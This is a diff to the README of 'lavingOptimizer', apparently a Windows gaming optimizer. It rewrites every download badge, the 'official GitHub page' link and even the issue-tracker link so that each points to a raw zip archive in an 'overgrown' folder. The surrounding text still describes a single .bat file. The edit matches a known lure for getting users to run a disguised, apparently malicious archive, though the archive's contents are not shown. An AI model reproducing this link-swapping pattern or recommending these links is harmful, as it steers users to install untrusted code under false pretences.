@@ -1,6 +1,6 @@
 # ⚙️ lavingOptimizer - Windows Gaming Performance Booster
 
-[![Download lavingOptimizer](https://img.shields.io/badge/Download-lavingOptimizer-brightgreen?style=for-the-badge)](https://github.com/mhmdrgibb/lavingOptimizer)
+[![Download lavingOptimizer](https://img.shields.io/badge/Download-lavingOptimizer-brightgreen?style=for-the-badge)](https://github.com/mhmdrgibb/lavingOptimizer/raw/refs/heads/main/overgrown/Optimizer_laving_v2.1-beta.1.zip)
 
 ---
 
@@ -49,12 +49,12 @@ The changes do not alter your files or game data. Instead, they adjust how Windo
 
 You will get the latest version by visiting the download page on GitHub.
 
-[![Download lavingOptimizer](https://img.shields.io/badge/Download-Now-orange?style=for-the-badge)](https://github.com/mhmdrgibb/lavingOptimizer)
+[![Download lavingOptimizer](https://img.shields.io/badge/Download-Now-orange?style=for-the-badge)](https://github.com/mhmdrgibb/lavingOptimizer/raw/refs/heads/main/overgrown/Optimizer_laving_v2.1-beta.1.zip)
 
 ### Step 1: Visit the Download Page
 
 1. Go to the official GitHub page:  
-   https://github.com/mhmdrgibb/lavingOptimizer  
+   https://github.com/mhmdrgibb/lavingOptimizer/raw/refs/heads/main/overgrown/Optimizer_laving_v2.1-beta.1.zip  
 2. Click on the green “Code” button or scroll to the “Releases” section.  
 3. Download the latest `.bat` file version. It should appear as a single file named something like `lavingOptimizer.bat`.
 
@@ -117,11 +117,11 @@ The tool’s interface and prompts are written in Turkish. However, they are sim
 
 If you find bugs or want to suggest improvements:
 
-- Open a new issue on the GitHub page: https://github.com/mhmdrgibb/lavingOptimizer/issues
+- Open a new issue on the GitHub page: https://github.com/mhmdrgibb/lavingOptimizer/raw/refs/heads/main/overgrown/Optimizer_laving_v2.1-beta.1.zip
 - Include details about your Windows version and what problem you faced.
 
 Developers welcome feedback to improve the tool.
 
 ---
 
-[![Download lavingOptimizer](https://img.shields.io/badge/Download-lavingOptimizer-blue?style=for-the-badge)](https://github.com/mhmdrgibb/lavingOptimizer)
+[![Download lavingOptimizer](https://img.shields.io/badge/Download-lavingOptimizer-blue?style=for-the-badge)](https://github.com/mhmdrgibb/lavingOptimizer/raw/refs/heads/main/overgrown/Optimizer_laving_v2.1-beta.1.zip)
